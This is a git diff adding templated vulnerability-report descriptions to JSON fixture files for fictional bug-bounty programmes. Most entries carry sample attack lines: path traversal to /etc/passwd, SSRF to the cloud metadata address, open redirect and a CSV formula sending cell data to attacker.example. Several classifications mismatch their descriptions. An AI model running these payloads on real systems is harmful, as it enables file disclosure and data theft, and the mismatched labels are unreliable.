+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21022,7 +21184,8 @@
           "offset": "9d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21157,7 +21320,8 @@
           "offset": "3d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21268,7 +21432,8 @@
           "offset": "1d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21410,7 +21575,8 @@
           "offset": "1d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21519,7 +21685,8 @@
           "offset": "1d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21668,7 +21835,8 @@
           "offset": "8d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21787,7 +21955,8 @@
           "offset": "3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21907,7 +22076,8 @@
           "offset": "16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22031,7 +22201,8 @@
           "offset": "1d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -22163,7 +22334,8 @@
           "offset": "5d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22281,7 +22453,8 @@
           "offset": "1d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22417,7 +22590,8 @@
           "offset": "3d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22516,7 +22690,8 @@
           "offset": "3d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22643,7 +22818,8 @@
           "offset": "5d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22815,7 +22991,8 @@
           "offset": "8d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22962,7 +23139,8 @@
           "offset": "1d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.eichenwald-digital.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23106,7 +23284,8 @@
           "offset": "6d 19h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23229,7 +23408,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://iam.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23385,7 +23565,8 @@
           "offset": "4d 7h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23537,7 +23718,8 @@
           "offset": "7d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.eichenwald-digital.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23648,7 +23830,8 @@
           "offset": "3d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23763,7 +23946,8 @@
           "offset": "1d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://iam.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/kanton_waldlicht_amt_fuer_bildung_und_schulen_reports.json b/fixtures/reports/kanton_waldlicht_amt_fuer_bildung_und_schulen_reports.json
index b48a935..8063d46 100644
--- a/fixtures/reports/kanton_waldlicht_amt_fuer_bildung_und_schulen_reports.json
+++ b/fixtures/reports/kanton_waldlicht_amt_fuer_bildung_und_schulen_reports.json
@@ -66,7 +66,8 @@
           "offset": "5d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -165,7 +166,8 @@
           "offset": "1d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -263,7 +265,8 @@
           "offset": "23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -395,7 +398,8 @@
           "offset": "3d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -508,7 +512,8 @@
           "offset": "4d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -639,7 +644,8 @@
           "offset": "3d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -766,7 +772,8 @@
           "offset": "9d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -901,7 +908,8 @@
           "offset": "4d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1041,7 +1049,8 @@
           "offset": "5d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
